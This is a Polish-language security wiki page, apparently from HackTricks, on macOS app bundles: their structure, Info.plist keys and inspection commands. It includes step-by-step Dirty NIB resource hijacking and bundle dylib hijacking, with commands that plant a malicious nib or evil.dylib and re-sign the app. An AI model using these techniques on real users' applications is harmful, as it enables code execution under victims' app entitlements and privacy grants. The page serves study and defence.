# Bundles macOS

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

Bundles w macOS służą jako kontenery dla różnorodnych zasobów, w tym aplikacji, bibliotek i innych niezbędnych plików, dzięki czemu w Finderze są wyświetlane jako pojedyncze obiekty, takie jak dobrze znane pliki `*.app`. Najczęściej spotykanym bundle jest bundle `.app`, choć powszechne są również inne typy, takie jak `.framework`, `.systemextension` i `.kext`.

### Podstawowe elementy bundle

Wewnątrz bundle, w szczególności w katalogu `<application>.app/Contents/`, znajduje się wiele ważnych zasobów:

- **\_CodeSignature**: Ten katalog przechowuje szczegóły code-signing niezbędne do weryfikowania integralności aplikacji. Informacje o code-signing można sprawdzić za pomocą poleceń takich jak:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Zawiera wykonywalny plik binarny aplikacji uruchamiany po interakcji użytkownika.
- **Resources**: Repozytorium komponentów interfejsu użytkownika aplikacji, w tym obrazów, dokumentów i opisów interfejsu (plików nib/xib).
- **Info.plist**: Pełni funkcję głównego pliku konfiguracyjnego aplikacji, kluczowego dla prawidłowego rozpoznawania aplikacji przez system i interakcji z nią.

#### Ważne klucze w Info.plist

Plik `Info.plist` jest podstawą konfiguracji aplikacji i zawiera takie klucze jak:

- **CFBundleExecutable**: Określa nazwę głównego pliku wykonywalnego znajdującego się w katalogu `Contents/MacOS`.
- **CFBundleIdentifier**: Udostępnia globalny identyfikator aplikacji, szeroko wykorzystywany przez macOS do zarządzania aplikacjami.
- **LSMinimumSystemVersion**: Wskazuje minimalną wersję macOS wymaganą do uruchomienia aplikacji.

### Eksplorowanie Bundles

Aby wyświetlić zawartość bundle, takiego jak `Safari.app`, można użyć następującego polecenia: `bash ls -lR /Applications/Safari.app/Contents`

Eksploracja ujawnia katalogi takie jak `_CodeSignature`, `MacOS`, `Resources` oraz pliki takie jak `Info.plist`, z których każdy pełni określoną funkcję — od zabezpieczania aplikacji po definiowanie jej interfejsu użytkownika i parametrów działania.

#### Dodatkowe katalogi Bundles

Oprócz typowych katalogów bundles mogą również zawierać:

- **Frameworks**: Zawiera frameworki dołączone do aplikacji. Frameworki przypominają dylibs, ale zawierają dodatkowe zasoby.
- **PlugIns**: Katalog wtyczek i rozszerzeń zwiększających możliwości aplikacji.
- **XPCServices**: Zawiera usługi XPC używane przez aplikację do komunikacji out-of-process.

Taka struktura zapewnia, że wszystkie niezbędne komponenty są zamknięte w bundle, co ułatwia tworzenie modularnego i bezpiecznego środowiska aplikacji.

Szczegółowe informacje o kluczach `Info.plist` i ich znaczeniu można znaleźć w obszernej dokumentacji Apple dla developerów: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).<sup>[[3]](#references)</sup>

## Uwagi dotyczące bezpieczeństwa i wektory nadużyć

- **Gatekeeper / App Translocation**: Gdy quarantined bundle jest uruchamiany po raz pierwszy, macOS przeprowadza dogłębną weryfikację sygnatury i może uruchomić go ze losowej ścieżki translocated. Po zaakceptowaniu kolejne uruchomienia wykonują już tylko pobieżne kontrole; pliki zasobów w `Resources/`, `PlugIns/`, nibach itd. były historycznie pomijane. Od macOS 13 Ventura przy pierwszym uruchomieniu wymuszana jest dogłębna kontrola, a nowe uprawnienie TCC *App Management* ogranicza procesy third-party przed modyfikowaniem innych bundles bez zgody użytkownika, jednak starsze systemy nadal są podatne.
- **Kolizje Bundle Identifier**: Wiele embedded targets (PlugIns, helper tools) ponownie używających tego samego `CFBundleIdentifier` może zakłócić walidację sygnatury i czasami umożliwić przejęcie lub pomylenie schematu URL. Zawsze wyliczaj sub-bundles i weryfikuj unikalność identyfikatorów.

## Resource Hijacking (Dirty NIB / NIB Injection)

Przed Ventura podmiana zasobów interfejsu użytkownika w podpisanej aplikacji mogła ominąć pobieżne code signing i doprowadzić do wykonania kodu z entitlements aplikacji. Obecne badania (2024) pokazują, że nadal działa to w systemach starszych niż Ventura oraz w buildach bez quarantine:<sup>[[1]](#references)[[2]](#references)</sup>

1. Skopiuj docelową aplikację do lokalizacji z prawem zapisu (np. `/tmp/Victim.app`).
2. Zastąp `Contents/Resources/MainMenu.nib` (lub dowolny nib zadeklarowany w `NSMainNibFile`) złośliwym nibem, który tworzy instancję `NSAppleScript`, `NSTask` itd.
3. Uruchom aplikację. Złośliwy nib zostanie wykonany w ramach bundle ID i entitlements ofiary (granty TCC, mikrofon/kamera itd.).
4. Ventura+ ogranicza ten problem, przeprowadzając dogłębną weryfikację bundle przy pierwszym uruchomieniu i wymagając uprawnienia *App Management* przy późniejszych modyfikacjach, dlatego utrzymanie dostępu jest trudniejsze, jednak ataki podczas pierwszego uruchomienia na starszych wersjach macOS nadal są możliwe.<sup>[[1]](#references)</sup>

Minimalny przykład złośliwego payloadu nib (skompiluj xib do nib za pomocą `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking wewnątrz Bundles

Ponieważ wyszukiwanie `@rpath` preferuje zbundlowane Frameworks/PlugIns, umieszczenie złośliwej biblioteki w `Contents/Frameworks/` lub `Contents/PlugIns/` może przekierować kolejność ładowania, gdy główny binary jest podpisany bez library validation lub z nieprawidłową kolejnością `LC_RPATH`.

Typowe kroki podczas wykorzystywania niezarejestrowanego/ad-hoc bundle:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Uwagi:
- Hardened runtime bez `com.apple.security.cs.disable-library-validation` blokuje zewnętrzne dylibs; najpierw sprawdź entitlements.
- XPC services w `Contents/XPCServices/` często ładują sąsiednie frameworks — podobnie zmodyfikuj ich pliki binarne w celu uzyskania persistence lub ścieżek do privilege escalation.

## Skrócona ściągawka do inspekcji
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referencje

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
- [3] [Apple Developer - Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)

{{#include ../../../banners/hacktricks-training.md}}
